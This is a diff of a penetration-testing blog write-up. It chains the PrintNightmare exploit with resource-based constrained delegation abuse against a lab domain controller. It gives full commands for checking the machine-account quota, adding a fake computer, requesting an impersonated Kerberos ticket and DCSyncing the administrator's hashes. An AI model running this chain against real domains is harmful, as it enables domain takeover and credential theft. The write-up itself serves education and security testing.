@@ -98,7 +98,25 @@ $adsiobject.Put("msDS-allowedToActOnBehalfOfOtherIdentity", $SDBytes)
 $adsiobject.setinfo()
 ```
 
-Now I have to create a fake machine account to use it when it comes to requesting a forwardable ticket with S4U2Self & S4U2Proxy (some good references on how to abuse RBCD can be found on [PPN](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/delegation-abuse#resource-based-constrained-delegation-rbcd) and in my [HTB Hades write-up](https://snovvcrash.rocks/2020/12/28/htb-hades.html#abusing-kerberos-resource-based-constrained-delegation)):
+Now I have to create a fake machine account to use it when it comes to requesting a forwardable ticket with S4U2Self & S4U2Proxy (some good references on how to abuse RBCD can be found on [PPN](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/delegation-abuse#resource-based-constrained-delegation-rbcd) and in my [HTB Hades write-up](https://snovvcrash.rocks/2020/12/28/htb-hades.html#abusing-kerberos-resource-based-constrained-delegation)).
+
+Firstly, I will enumerate if `ms-DS-MachineAccountQuota` allows to add new computer accounts. Do it with PowerShell:
+
+```powershell
+Get-ADObject -Identity "DC=megacorp,DC=local" -Properties * | select ms-ds-machineAccountQuota
+```
+
+[![check-machineaccountquota-pwsh.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/check-machineaccountquota-pwsh.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/check-machineaccountquota-pwsh.png)
+
+Or do it remotely from Linux with [go-windapsearch](https://github.com/ropnop/go-windapsearch):
+
+```bash
+./go-windapsearch --dc 10.10.10.179 -d megacorp.local -u lowpriv -p 'Passw0rd1!' -m custom --filter '(&(objectClass=domain)(distinguishedName=DC=megacorp,DC=local))' --attrs ms-ds-machineAccountQuota
+```
+
+[![check-machineaccountquota-ldap.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/check-machineaccountquota-ldap.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/check-machineaccountquota-ldap.png)
+
+At this point I'm sure that new machine account creation will succeed:
 
 ```bash
 addcomputer.py megacorp.local/lowpriv:'Passw0rd1!' -dc-ip 10.10.10.179 -computer-name fakemachine -computer-pass 'Passw0rd2!'
@@ -149,34 +167,34 @@ python CVE-2021-1675.py megacorp.local/lowpriv:'Passw0rd1!'@10.10.10.179 '\\10.1
 
 [![trigger-the-exploit.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/trigger-the-exploit.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/trigger-the-exploit.png)
 
-In the background it will set the `PrincipalsAllowedToDelegateToAccount` property containing objects that can delegate to MULTIMASTER. It can be verified like follows:
+In the background it will set the `msDS-AllowedToActOnBehalfOfOtherIdentity` property containing objects that can delegate to MULTIMASTER. It can be verified like follows with PowerShell:
 
 ```powershell
-Get-ADComputer MULTIMASTER -Properties PrincipalsAllowedToDelegateToAccount
+Get-ADComputer MULTIMASTER -Properties * | select -Expand msds-allowedToActOnBehalfOfOtherIdentity
 ```
 
-[![check-properties-pwsh.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/check-properties-pwsh.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/check-properties-pwsh.png)
+[![check-delegation-pwsh.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/check-delegation-pwsh.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/check-delegation-pwsh.png)
 
-Or do it with [go-windapsearch](https://github.com/ropnop/go-windapsearch) remotely:
+Or I can modify the `findDelegation.py` script to look for delegations on DCs (get rid of this `(!(UserAccountControl:1.2.840.113556.1.4.803:=8192))` part of the search query [here](https://github.com/SecureAuthCorp/impacket/blob/4821d64e3a078a79e60c0b03f08d0984d9a17728/examples/findDelegation.py#L131) which excludes domain controllers from the result) and perform the enumeration from Linux:
 
 ```bash
-./go-windapsearch --dc 10.10.10.179 -d megacorp.local -u lowpriv -p 'Passw0rd1!' -m custom --filter '(&(objectClass=computer)(samAccountName=MULTIMASTER$))' --attrs msds-allowedToActOnBehalfOfOtherIdentity
+findDelegation.py megacorp.local/lowpriv:'Passw0rd1!' -dc-ip 10.10.10.179
 ```
 
-[![check-properties-ldap.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/check-properties-ldap.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/check-properties-ldap.png)
+[![check-delegation-ldap.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/check-delegation-ldap.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/check-delegation-ldap.png)
 
 Now I can request a service ticket for LDAP:
 
 ```bash
-getST.py megacorp.local/fakemachine:'Passw0rd2!' -dc-ip 10.10.10.179 -spn ldap/MULTIMASTER.megacorp.local -impersonate administrator
+getST.py megacorp.local/fakemachine:'Passw0rd2!' -dc-ip 10.10.10.179 -spn ldap/MULTIMASTER.megacorp.local -impersonate 'MULTIMASTER$'
 ```
 
 [![request-ticket.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/request-ticket.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/request-ticket.png)
 
-And finally DCSync the domain with `secretsdump.py`:
+And finally DCSync the domain with `secretsdump.py` impersonating the domain controller:
 
 ```bash
-export KRB5CCNAME=/home/snovvcrash/PrintNightmare/CVE-2021-1675/administrator.ccache
+export KRB5CCNAME=/home/snovvcrash/PrintNightmare/CVE-2021-1675/MULTIMASTER\$.ccache
 secretsdump.py multimaster.megacorp.local -dc-ip 10.10.10.179 -k -no-pass -just-dc-user administrator
 ```
 
